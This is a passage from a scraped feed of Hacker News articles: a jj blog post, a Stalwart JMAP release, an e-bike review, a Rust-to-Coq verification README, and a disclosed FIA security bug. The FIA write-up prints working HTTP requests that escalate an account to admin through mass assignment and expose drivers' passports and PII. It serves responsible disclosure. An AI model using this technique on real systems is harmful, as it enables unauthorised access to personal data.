    &lt;p&gt;For a team: well, Mozilla was backing it. This is a big deal. It meant that there were folks whose job it was to work on the language. Thereâs so much that you need to do to make a new language, and that means a ton of work, which means that if youâre going to be able to get it done in a reasonable amount of time, having paid folks working on it is certainly better than the alternative. Check.&lt;/p&gt;
    &lt;p&gt;And finally, how does this translate into users? Well, Mozilla was planning on using it in Firefox. This is huge. Firefox is a major project, and if they could manage to use Rust in it, that would prove that Rust was capable of doing real work. And, more importantly, it would mean that there would be a lot of folks who would need to learn Rust to work on Firefox. This would create a base of users, which would help the language grow. Check.&lt;/p&gt;
    &lt;p&gt;Finally, even though it wasnât part of my initial assessment, I just really liked the Rust folks. I had joined IRC and chatted with people, and unlike many IRC rooms, they were actually really nice. I wanted to be around them more. And if I did, other people probably would too. So that was also a plus.&lt;/p&gt;
    &lt;p&gt;So, I started learning Rust. I decided to write a tutorial for it, âRust for Rubyists,â because Iâm a sucker for alliteration. And I eventually joined the team, co-authored The Book, and if youâre reading this post, you probably know the rest of the story.&lt;/p&gt;
    &lt;head rend="h2"&gt;Enter jj&lt;/head&gt;
    &lt;p&gt;For some background, jj is a new version control system (VCS), not a programming language. It is written in Rust though! While I talked about how I decided to get involved with Rust above, my approach here generalizes to other kinds of software projects, not just programming languages.&lt;/p&gt;
    &lt;p&gt;I have a rule of thumb: if Rain likes something, I will probably like that thing, as we have similar technical tastes. So when I heard her talk about jj, I put that on my list of things to spend some time with at some point. I was especially intrigued because Rain had worked at Meta on their source control team. So if sheâs recommending something related to source control, thatâs a huge green flag.&lt;/p&gt;
    &lt;p&gt;It took me a while, but one Saturday morning, I woke up a bit early, and thought to myself, âI have nothing to do today. Letâs take a look at jj.â So I did. Youâll note that link goes to a commit starting a book about jj. Since it worked for me with Rust, it probably would work for me for jj as well. Writing about something really helps clarify my thinking about it, and what better time to write something for a beginner than when youâre also a beginner?&lt;/p&gt;
    &lt;p&gt;Anyway, people seem to really like my tutorial, and Iâm thankful for that.&lt;/p&gt;
    &lt;head rend="h2"&gt;The future of jj&lt;/head&gt;
    &lt;p&gt;So, what do I see in jj? Well, a lot of it kind of eerily mirrors what I saw in Rust: a good market fit, a solid team, and a potential user base.&lt;/p&gt;
    &lt;p&gt;But the market fit is interesting. Git has clearly won, it has all of the mindshare, but since you can use jj to work on Git repositories, it can be adopted incrementally. At Oxide, Rain started using jj, and more of us did, and now weâve got a chat channel dedicated to it. This is, in my opinion, the only viable way to introduce a new VCS: it has to be able to be partially adopted.&lt;/p&gt;
    &lt;p&gt;Google is using jj, and so that is a bit different than Mozilla, but the same basic idea. I have more to say about Googleâs relationship to jj, but thatâs going to be a follow-up blog post. What I will say in this post is that at the first ever jj conference a few weeks ago, Martin (the creator of jj) said that internal adoption is going really well. Iâm burying the lede a bit here, because the video isnât up yet, and I donât want to get the details of some of the more exciting news incorrect in this post. I also donât mean to imply that everyone at Google is using jj, but the contingent feels significant to me, given how hard it is to introduce a new VCS inside a company of that size. Well, in this case, itâs using Piper as the backend, so you could argue about some of the details here, but the point is: jj is being used in projects as small as individual developers and as large as one of the largest monorepos in the world. Thatâs a big deal. It can show the social proof needed for others to give jj a chance.&lt;/p&gt;
    &lt;p&gt;Outside of Google, a lot of people say that thereâs a bit of a learning curve, but once you get over that, people really like it. Sound familiar? I think jj is different from Rust in this regard in that itâs also very easy to learn if you arenât someone who really knows a ton about Git. Itâs folks that really know Git internals and have put time and care into their workflows that can struggle a bit with jj, because jj is different. But for people who just want to get work done, jj is really easy to pick up. And when people do, they often tend to like it. jj has developed a bit of a reputation for having a passionate fanbase. People are adopting it in a skunkworks way. This is a great sign for a new tool.&lt;/p&gt;
    &lt;p&gt;And finally, the team. Martin is very dedicated to jj, and has been working on it for a long time. Thereâs also a small group of folks working on it with him. It recently moved out from his personal GitHub account to its own organization, and has started a more formal governance. The team is full of people who have a deep history of working on source control tools, and they know what theyâre doing. The burgeoning jj community reminds me of that early Rust community: a bunch of nice folks who are excited about something and eager to help it grow.&lt;/p&gt;
    &lt;p&gt;Basically, to me, jjâs future looks very bright. It reminds me of Rust in all of the best ways.&lt;/p&gt;
    &lt;head rend="h2"&gt;Putting my money where my mouth is&lt;/head&gt;
    &lt;p&gt;Speaking of burying the ledeâ¦ Iâve decided to leave Oxide. Oxide is the best job Iâve ever had, and I love the people I work with. I was employee 17. I think the business will do fantastic in the future, and honestly itâs a bit of a strange time to decide to leave, since things are going so well. But at the same time, some of my friends have started a new company, ERSC, which is going to be building a new platform for developer collaboration on top of jj. Donât worry, âerrsskâ isnât going to be the name of the product. Itâs kind of like how GitHub was incorporated as Logical Awesome, but nobody calls it that.&lt;/p&gt;
    &lt;p&gt;This wonât be happening until next month, I have some stuff to wrap up at Oxide, and Iâm going to take a week off before starting. But as sad as I am to be leaving Oxide, Iâm also really excited to be able to spend more time working in the jj community, and helping build out this new platform. For those of you whoâve been asking me to finish my tutorial, well, now Iâll have the time to actually do that! Iâm sorry itâs taken so long! Youâll see me talking about jj even more, spending even more time in the Discord, and generally being more involved in the community. And Iâll be writing more posts about it here as well, of course.&lt;/p&gt;
    &lt;p&gt;Iâm really excited about this next chapter. 2025 has been a very good year for me so far, for a number of reasons, and I am grateful to be able to take a chance on something that Iâm truly passionate about.&lt;/p&gt;
    &lt;p&gt;Hereâs my post about this post on BlueSky:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://steveklabnik.com/writing/i-see-a-future-in-jj/"/><published>2025-10-22T17:21:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45672336</id><title>JMAP for Calendars, Contacts and Files Now in Stalwart</title><updated>2025-10-23T06:15:48.777482+00:00</updated><content>&lt;doc fingerprint="7f97c6ce69b80dc3"&gt;
  &lt;main&gt;
    &lt;p&gt;After four years of development, weâre thrilled to announce a major milestone in the evolution of Stalwart â the full implementation of JMAP for Calendars, Contacts, Address Books, File Storage, and Sharing. With this release, Stalwart becomes the first JMAP server to fully support the entire family of JMAP collaboration protocols, marking a new era for open, efficient, and elegant groupware.&lt;/p&gt;
    &lt;head rend="h2"&gt;A New Generation of Protocols&lt;/head&gt;
    &lt;p&gt;Over the past few years, the IETF has been redefining how email, calendars, and contacts are synchronized and shared. Building upon the success of JMAP for Mail, several new protocol extensions have been introduced:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;JMAP for Calendars - A modern replacement for CalDAV and CalDAV Scheduling.&lt;/item&gt;
      &lt;item&gt;JMAP for Contacts â A powerful alternative to CardDAV.&lt;/item&gt;
      &lt;item&gt;JMAP for File Storage â A replacement for WebDAV-based file storage.&lt;/item&gt;
      &lt;item&gt;JMAP Sharing â A modern successor to WebDAV ACL.&lt;/item&gt;
      &lt;item&gt;JSCalendar - A clean, JSON-based evolution of iCalendar.&lt;/item&gt;
      &lt;item&gt;JSContact â A modernized, JSON-native successor to vCard.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Together, these standards offer a cohesive and elegant ecosystem that replaces decades of fragmented WebDAV-based technologies.&lt;/p&gt;
    &lt;head rend="h2"&gt;Limitations of Yesterday's Technology&lt;/head&gt;
    &lt;p&gt;WebDAV and its descendants â CalDAV, CardDAV, and related extensions â have served the Internet well. They are robust, widely adopted, and battle-tested. Yet, their XML-based design is notoriously verbose, inconsistent, and difficult to implement correctly. Information is scattered across HTTP headers, XML payloads, and even embedded iCalendar data, creating endless compatibility and interoperability challenges between clients and servers.&lt;/p&gt;
    &lt;p&gt;Similarly, iCalendar and vCard, while expressive and versatile, have accumulated decades of technical debt. They contain countless properties and parametersâmany rarely used, some obsolete, and others inconsistently implemented across versions. This clutter has made both formats unwieldy and error-prone, often requiring complex parsing logic to handle edge cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;JMAP: A Modern Solution for Modern Needs&lt;/head&gt;
    &lt;p&gt;The JMAP protocol was originally developed as a more efficient, modern replacement for IMAP and SMTP submissions. Its strengths lie in simplicity, clarity, and network efficiency â all built on top of JSON over HTTPS.&lt;/p&gt;
    &lt;p&gt;Now, with the introduction of JMAP for Calendars, Contacts, Files, and Sharing, the same design philosophy extends beyond email to the entire collaboration stack. These protocols deliver what DAV always aimed for but never quite achieved: a clean, uniform, and easily implementable API for all personal and group data â mail, calendars, contacts, files, and shared resources.&lt;/p&gt;
    &lt;p&gt;Meanwhile, JSCalendar and JSContact reimagine iCalendar and vCard as elegant JSON-based formats. They strip away decades of accumulated cruft, unify representations, and offer a clear, unambiguous, and expressive data model. Both are human-readable, developer-friendly, and efficient to parse â a perfect fit for modern applications.&lt;/p&gt;
    &lt;p&gt;Together, JMAP and these new data models make calendaring, contact management, and file sharing not only easier to implement but also faster and more reliable.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why This Matters&lt;/head&gt;
    &lt;p&gt;This release represents more than new features â it marks a shift in how groupware protocols are designed and implemented. For the first time, developers and organizations can build on a single, coherent, JSON-based framework for mail, contacts, calendars, and shared resources.&lt;/p&gt;
    &lt;p&gt;We believe this will revolutionize calendaring and collaboration. Implementations will become easier, interoperability issues will decrease, and innovation will accelerate. The simplicity and predictability of JMAP empower both clients and servers to focus on features and user experience, not protocol gymnastics.&lt;/p&gt;
    &lt;head rend="h2"&gt;Client Support and Ecosystem&lt;/head&gt;
    &lt;p&gt;As Stalwart is the first complete JMAP server to support these new protocols, client support is still emerging. However, weâre excited to share that several projects are already working to adopt these new standards. Mailtemi, Parula, and OpenCloud are actively developing client-side implementations for JMAP Calendars, Contacts, and File Storage. The ecosystem is growing, and we expect rapid adoption as developers experience the elegance and power of JMAP firsthand.&lt;/p&gt;
    &lt;head rend="h2"&gt;A Word of Thanks&lt;/head&gt;
    &lt;p&gt;We would like to express our sincere gratitude to NLNet for supporting the development of these features through the NGI Zero grant program. Their commitment to open standards and privacy-respecting technology continues to make projects like Stalwart possible.&lt;/p&gt;
    &lt;head rend="h2"&gt;Looking Ahead to 1.0.0&lt;/head&gt;
    &lt;p&gt;After four years of dedicated development, weâre proud to announce that Stalwart is now feature complete. With this milestone, all the core capabilities of a modern mail and collaboration server are fully implemented.&lt;/p&gt;
    &lt;p&gt;That said, our work is far from over. We are now focusing on finalizing the database schema, improving performance, and addressing the hundreds of enhancement requests on GitHub. Our goal is to deliver a stable &lt;code&gt;1.0.0&lt;/code&gt; release within the next few months â one that sets a new standard for open, efficient, and modern communication servers.&lt;/p&gt;
    &lt;p&gt;Stalwart is now the most complete, elegant, and forward-looking JMAP collaboration platform available.&lt;/p&gt;
    &lt;p&gt;And this is only the beginning.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://stalw.art/blog/jmap-collaboration/"/><published>2025-10-22T17:26:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45672844</id><title>Rivian's TM-B electric bike</title><updated>2025-10-23T06:15:48.548680+00:00</updated><content>&lt;doc fingerprint="2229557b01359b21"&gt;
  &lt;main&gt;
    &lt;p&gt;Rivianâs micromobility spinoff Also has just taken the wraps off its TM-B e-bike, TM-Q pedal-assisted electric quad bike, and Alpha Wave helmet that represents âa breakthrough in rider safety and connectivity.â&lt;/p&gt;
    &lt;head rend="h1"&gt;Rivianâs first e-bike is unlike anything youâve ever seen&lt;/head&gt;
    &lt;p&gt;The TM-B electric bike is launching alongside the TM-Q pedal-assisted quad and Alpha Wave helmet.&lt;/p&gt;
    &lt;p&gt;The TM-B electric bike is launching alongside the TM-Q pedal-assisted quad and Alpha Wave helmet.&lt;/p&gt;
    &lt;p&gt;The TM-B (aka Transcendent Mobility - Bike) with its 24 x 2.6-inch wheels and integrated front- and rear-lighting looks and functions like nothing else on the market. It features a new pedal-by-wire drivetrain called âDreamRideâ developed in-house. The rider pedals a generator, which replenishes the battery, while a separate software-driven traction motor drives the rear wheel via a Gates Carbon belt.&lt;/p&gt;
    &lt;p&gt;The removable battery â available in either 538Wh or 808Wh packs, offering up 100 miles of range â features two USB-C ports. The batteries can be charged over USB-C at 240W, going from zero to full in two hours and 20 minutes or three hours and 45 minutes, respectively. They can also act as a portable power bank for your gadgets. An E Ink display shows the batteryâs current charge.&lt;/p&gt;
    &lt;p&gt;As a Class 3 e-bike, it has a pedal-assisted top speed of 28mph (45kph). It also features a throttle good for 20mph where regulations allow, and an astounding 180Nm of torque on tap â enough to flatten steep hills and make quick starts off the line when carrying heavy loads. Hydraulic disc brakes help bring everything to a controlled stop, while regenerative braking could extend range by an estimated 25 percent.&lt;/p&gt;
    &lt;p&gt;The top frame of the TM-B is modular by design, so the bike can be transformed without tools into a cargo hauler, kid carrier, or cruiser with a bench seat. The seat post is unlocked via a quick swipe from the 5-inch circular touchscreen console. An inverted front fork suspension and air shock will help soak up bumps for riders ranging from 4 feet 11 inches to 6 feet 8 inches.&lt;/p&gt;
    &lt;p&gt;Thereâs also plenty of security baked in that automatically activates and deactivates when the rider is nearby. It locks the battery, back wheel, and frame, with tamper alerts and bike location provided in real time.&lt;/p&gt;
    &lt;p&gt;A $4,500 launch edition TM-B can be preordered now with delivery slated for spring 2026. A $4,000 base edition is scheduled for sometime later in 2026.&lt;/p&gt;
    &lt;p&gt;Also also unveiled its Alpha Wave helmet. âIt incorporates Release Layer System (RLS), a technology that offers a step-change in rotational impact protection,â says Also, which certainly sounds impressive. It also features integrated lights and a four-speaker, wind-shielded internal audio system with two noise-canceling mics. The helmet integrates with the TM-Bâs console, where music, calls, and podcasts can be controlled on the bike.&lt;/p&gt;
    &lt;p&gt;Lastly, Alsoâs TM-Q is the TM-B extended to a pedal-assisted electric four-wheeler to carry heavier loads. Also says itâll be âbike lane compliant,â so it can be used for last-mile deliveries in congested cities. Itâll be sold in both commercial and consumer variants, the latter for ridding around gated communities.&lt;/p&gt;
    &lt;p&gt;The TM-B aesthetic is certainly divisive â I love it, but I was a big fan of Cakeâs utilitarian designs before bankruptcy. Itâs a lot to take in and certainly needs thorough testing to draw any final conclusion. But itâs good to see a fresh, deep-pocketed face breathing new life into e-bikes when entrenched players and boutique brands are struggling to stay afloat.&lt;/p&gt;
    &lt;p&gt;âOur vision is to bring together the latest technology with fun, thoughtful design to create small EVs that inspire people to adopt these more efficient modes,â said Chris Yu, president of Also. âThis launch has been years in the making and it is just the beginning of a broader platform we are building that we believe will catalyze adoption globally.â&lt;/p&gt;
    &lt;head rend="h2"&gt;Most Popular&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;GM will ditch Apple CarPlay and Android Auto on all its cars, not just EVs&lt;/item&gt;
      &lt;item&gt;Even Xbox developer kits are getting a big price hike&lt;/item&gt;
      &lt;item&gt;Rivianâs first e-bike is unlike anything youâve ever seen&lt;/item&gt;
      &lt;item&gt;Meta is axing 600 roles across its AI division&lt;/item&gt;
      &lt;item&gt;Amazon hopes to replace 600,000 US workers with robots, according to leaked documents&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.theverge.com/news/804157/rivian-tm-b-electric-bike-price-specs-helmet-quad"/><published>2025-10-22T18:00:20+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45673130</id><title>Accessing Max Verstappen's passport and PII through FIA bugs</title><updated>2025-10-23T06:15:48.259480+00:00</updated><content>&lt;doc fingerprint="6c1f451b1fc79758"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;With security startups getting flooded with VC funding in the past few years, some of the biggest networking events have centered themselves around the Formula 1 Grand Prix. Companies like CrowdStrike and Darktrace spend millions of dollars sponsoring teams, while others like Bitdefender have official partnerships to be a racing team's cybersecurity partner.&lt;/p&gt;
    &lt;p&gt;Having been able to attend these events by hoarding airline miles and schmoozing certain cybersecurity vendors, Gal Nagli, Sam Curry, and I thought it would be fun to try and hack some of the different supporting websites for the Formula 1 events.&lt;/p&gt;
    &lt;p&gt;This blog is part 1 of 3 in a series of vulnerabilities found in Formula 1.&lt;/p&gt;
    &lt;head rend="h2"&gt;Finding F1 Driver Licenses&lt;/head&gt;
    &lt;p&gt;To race in Formula 1, drivers hold an FIA Super Licence. Itâs issued annually through a driverâs national motorsport authority (ASN) once theyâve met the FIAâs requirements, typically spending years in smaller races to earn Super Licence points, along with meeting minimum age thresholds and other medical/written tests.&lt;/p&gt;
    &lt;p&gt;F1 drivers often compete outside Grands Prix as well, where the FIA uses a Driver Categorisation (Bronze/Silver/Gold/Platinum) to balance teams. That categorisation is managed via the FIA portal at drivercategorisation.fia.com, which supports public self-registration for competitors to request or update their Bronze/Silver/Gold/Platinum status and submit results for review. This system is separate from the Super Licence, but many F1 drivers appear in both and receive automatic Platinum status for holding an active Super Licence.&lt;/p&gt;
    &lt;p&gt;After creating an account with an email and password, you are thrown into the actual application process. Normally, you will have to upload a lot of supporting documents for your request for categorization, including identity documents and racing CVs/history. However, we noticed there is a very simple HTTP PUT request that is used to update your user profile:&lt;/p&gt;
    &lt;code&gt;PUT /api/users/12934 HTTP/1.1
Host: driverscategorisation.fia.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Length: 246
Content-Type: application/json

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null
}&lt;/code&gt;
    &lt;p&gt;The HTTP request to update our profile didn't really have many interesting attributes, but the JSON returned in the response had a lot of extra values:&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 200
Content-type: application/json
Content-Length: 313

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "keepNamePrivate": false,
  "nickName2": null,
  "birthDate": "2000-02-17",
  "gender": null,
  "token": null,
  "roles": null,
  "country": null,
  "filters": [],
  "status": "ACTIVATED",
  "secondaryEmail": null
}&lt;/code&gt;
    &lt;p&gt;The JSON HTTP response for updating our own profile contained the "roles" parameter, something that might allow us to escalate privileges if the PUT request was vulnerable to mass assignment. We began looking through the JavaScript for any logic related to this parameter.&lt;/p&gt;
    &lt;p&gt;Based on the JavaScript, there were a number of different roles on the website that were intended to be used by drivers, FIA staff, and site administrators. The most interesting one was obviously admin, so we guessed the correct HTTP PUT request format to try and update our roles based on the JavaScript:&lt;/p&gt;
    &lt;code&gt;PUT /api/users/12934 HTTP/1.1
Host: driverscategorisation.fia.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Length: 246
Content-Type: application/json

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "roles": [
    {
      "id": 1,
      "description": "ADMIN role",
      "name": "ADMIN"
    }
  ]
}&lt;/code&gt;
    &lt;p&gt;Our test worked exactly as predicted. The HTTP response showed that the update was successful, and we now held the administrator role for the website.&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 200
Content-type: application/json
Content-Length: 313

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "keepNamePrivate": false,
  "nickName2": null,
  "birthDate": "1999-10-17",
  "gender": null,
  "token": null,
  "roles": [
    {
      "id": 1,
      "description": "ADMIN role",
      "name": "ADMIN"
    }
  ],
  "country": null,
  "filters": [],
  "status": "ACTIVATED",
  "secondaryEmail": null
}
&lt;/code&gt;
    &lt;p&gt;We reauthenticated in order to refresh our session, and upon logging in, we were shown an entirely new dashboard that was intended to be used by FIA administrators to categorise drivers, manage employees, and update server-side variables like email templates and more. We seemed to have full admin access to the FIA driver categorization website.&lt;/p&gt;
    &lt;p&gt;To validate our finding, we attempted to load a driver's profile and observed the user's password hash, email address, phone number, passport, resume, and all related PII. Additionally, we could load all internal communications related to driver categorisation including comments about their performance and committee related decisions.&lt;/p&gt;
    &lt;p&gt;We stopped testing after seeing that it was possible to access Max Verstappen's passport, resume, license, password hash, and PII. This data could be accessed for all F1 drivers with a categorization, alongside sensitive information of internal FIA operations. We did not access any passports / sensitive information and all data has been deleted.&lt;/p&gt;
    &lt;head rend="h3"&gt;Disclosure timeline&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;06/03/2025: Initial disclosure to FIA via email and Linkedin&lt;/item&gt;
      &lt;item&gt;06/03/2025: Initial response from FIA, site taken offline&lt;/item&gt;
      &lt;item&gt;06/10/2025: Official response from FIA informing us of a comprehensive fix&lt;/item&gt;
      &lt;item&gt;10/22/2025: Release of blog post, public disclosure&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://ian.sh/fia"/><published>2025-10-22T18:21:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45673479</id><title>Criticisms of âThe Body Keeps the Scoreâ</title><updated>2025-10-23T06:15:48.155347+00:00</updated><content/><link href="https://josepheverettwil.substack.com/p/the-body-keeps-the-score-is-bullshit"/><published>2025-10-22T18:49:04+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45674126</id><title>Show HN: Cuq â Formal Verification of Rust GPU Kernels</title><updated>2025-10-23T06:15:47.623835+00:00</updated><content>&lt;doc fingerprint="1dbe9b9a44aab9d0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Cuq: A MIR-to-Coq Framework Targeting PTX for Formal Semantics and Verified Translation of Rust GPU Kernels&lt;/head&gt;
    &lt;p&gt;Rust's rise as a systems language has extended into GPU programming through projects like Rust-CUDA and rust-gpu, which compile Rust kernels to NVIDIA's PTX or SPIR-V backends. Yet despite Rust's strong safety guarantees, there is currently no formal semantics for Rust's GPU subset, nor any verified mapping from Rust's compiler IR to PTX's formally defined execution model.&lt;/p&gt;
    &lt;p&gt;This project introduces the first framework for formally verifying the semantics of Rust GPU kernels by translating Rust's Mid-level Intermediate Representation (MIR) into Coq and connecting it to the existing Coq formalization of the PTX memory model (Lustig et al., ASPLOS 2019). Rather than modeling Rust's ownership and borrowing rules directly, this work focuses on defining a mechanized operational semantics for a realistic subset of MIR and establishing memory-model soundness: proving that MIR atomic and synchronization operations compile soundly to PTX instructions under the PTX memory model.&lt;/p&gt;
    &lt;p&gt;Cuq = CUDA + Coq.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;No formal semantics for Rust GPU code: Although Rust compilers can emit GPU code via NVVM or SPIR-V, the semantics of such kernels are defined only informally through the compiler's behavior. There is no mechanized model of MIR execution for GPU targets.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Disconnect between high-level Rust and verified GPU models: NVIDIA's PTX memory model has a complete Coq specification, but that model has never been linked to a high-level language. Existing proofs connect only C++ atomics to PTX atomics.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;MIR as a verification sweet spot: MIR is a well-typed SSA IR that preserves Rust's structured control flow and side-effect information while stripping away syntax. It provides a precise, implementation-independent level at which to define semantics and translate to Coq.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Define a mechanized semantics for MIR: Implement a Coq formalization of a simplified MIR subset sufficient to express GPU kernels: variable assignment, arithmetic, control flow, memory loads/stores, and synchronization intrinsics.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Translate MIR to Coq: Develop a translation tool that consumes&lt;/p&gt;&lt;code&gt;rustc&lt;/code&gt;'s&lt;code&gt;-Z dump-mir&lt;/code&gt;output and produces corresponding Gallina definitions. The translation captures MIR basic blocks, terminators, and memory actions as Coq terms.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Connect to PTX semantics: Use the existing Coq formalization of PTX to define a memory-model correspondence between MIR and PTX traces. The initial goal is to prove soundness in the same sense as Lustig et al. (ASPLOS 2019):&lt;/p&gt;
        &lt;p&gt;If a MIR kernel is data-race-free under the MIR memory model, its compiled PTX program admits only executions consistent with the PTX memory model.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Property verification: Leverage this semantics to verify kernel-level properties such as:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Absence of divergent barrier synchronization;&lt;/item&gt;
          &lt;item&gt;Preservation of sequential equivalence (e.g., for reductions or scans);&lt;/item&gt;
          &lt;item&gt;Conformance to the PTX consistency model under shared-memory interactions.&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Prototype toolchain: Deliver a prototype that automatically translates Rust-CUDA kernels into Coq terms, evaluates their semantics within Coq, and interfaces with PTX proofs.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A Coq formalization of Rust MIR semantics for GPU kernels using Rust nightly-2025-03-02.&lt;/item&gt;
      &lt;item&gt;A MIRâPTX memory-model correspondence theorem, establishing soundness of atomic and synchronization operations for a well-defined kernel subset.&lt;/item&gt;
      &lt;item&gt;A prototype translator generating Coq verification artifacts from Rust code.&lt;/item&gt;
      &lt;item&gt;Case studies on standard CUDA benchmarks (e.g., SAXPY, reductions) verifying barrier correctness and dataflow soundness.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;While this first phase omits Rust's ownership and lifetime reasoning, the framework is designed to incorporate it later. Future extensions can integrate ownership types or affine resource logics into the MIR semantics, enabling end-to-end proofs of data-race freedom and alias safety.&lt;/p&gt;
    &lt;p&gt;This project establishes the missing formal bridge between Rust's compiler infrastructure and the only existing mechanized model of GPU execution. By defining verified semantics for MIR and connecting it to PTX, it provides the foundation for future CompCert-style verified compilation of GPU code and opens the door to ownership-aware proofs of safety and correctness for massively parallel Rust programs.&lt;/p&gt;
    &lt;p&gt;Rebuild the MIR dumps, translate them into Coq, and check the traces/bridges with:&lt;/p&gt;
    &lt;code&gt;make demo
&lt;/code&gt;
    &lt;p&gt;The target performs three steps:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;rustc -Z dump-mir=all&lt;/code&gt;for&lt;code&gt;examples/saxpy.rs&lt;/code&gt;and&lt;code&gt;examples/atomic_flag.rs&lt;/code&gt;(writes into&lt;code&gt;mir_dump/&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;tools/mir2coq.py&lt;/code&gt;parses the&lt;code&gt;PreCodegen.after&lt;/code&gt;dumps and regenerates&lt;code&gt;coq/examples/{saxpy,atomic_flag}_gen.v&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;make -C coq all&lt;/code&gt;type-checks the MIR semantics, the generated programs, and the MIRâPTX translation lemmas.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Afterwards you can inspect &lt;code&gt;coq/examples/*_gen.v&lt;/code&gt; and re-run &lt;code&gt;Eval compute&lt;/code&gt; queries found in &lt;code&gt;coq/MIRTests.v&lt;/code&gt; to see the MIR event traces and their PTX images.&lt;/p&gt;
    &lt;code&gt;examples/*.rs --rustc -Z dump-mir--&amp;gt; mir_dump/*.mir --tools/mir2coq.py--&amp;gt; coq/examples/*_gen.v
        \                                                                 |
         \--&amp;gt; target/*.ptx (optional)                                     v
           Coq build (MIRSyntax + MIRSemantics + Translate + Soundness) -&amp;gt; PTX event traces
&lt;/code&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Ensure the Rust nightly and Coq toolchain are available:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;code&gt;rustup toolchain install nightly-2025-03-02&lt;/code&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;code&gt;rustup override set nightly-2025-03-02&lt;/code&gt;
          &lt;/item&gt;
          &lt;item&gt;&lt;code&gt;opam install coq&lt;/code&gt;(Coq â¥ 8.18)&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;In every new shell, activate the Coq switch so&lt;/p&gt;&lt;code&gt;coq_makefile&lt;/code&gt;is on your&lt;code&gt;PATH&lt;/code&gt;:&lt;code&gt;eval "$(opam env)"&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Run the end-to-end build:&lt;/p&gt;
        &lt;code&gt;make demo make bad-demo&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Refer to &lt;code&gt;docs/mapping-table.md&lt;/code&gt; for the full table. In short:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;TyI32&lt;/code&gt;/&lt;code&gt;TyU32&lt;/code&gt;/&lt;code&gt;TyF32&lt;/code&gt;loads and stores become&lt;code&gt;EvLoad&lt;/code&gt;/&lt;code&gt;EvStore&lt;/code&gt;in PTX with&lt;code&gt;space_global&lt;/code&gt;, relaxed semantics, and the matching&lt;code&gt;mem_ty&lt;/code&gt;(&lt;code&gt;MemS32&lt;/code&gt;,&lt;code&gt;MemU32&lt;/code&gt;,&lt;code&gt;MemF32&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;Acquire loads and release stores attach &lt;code&gt;sem_acquire&lt;/code&gt;/&lt;code&gt;sem_release&lt;/code&gt;and CTA scope, mirroring the observed&lt;code&gt;ld.acquire.sys.&amp;lt;ty&amp;gt;&lt;/code&gt;and&lt;code&gt;st.release.sys.&amp;lt;ty&amp;gt;&lt;/code&gt;.&lt;/item&gt;
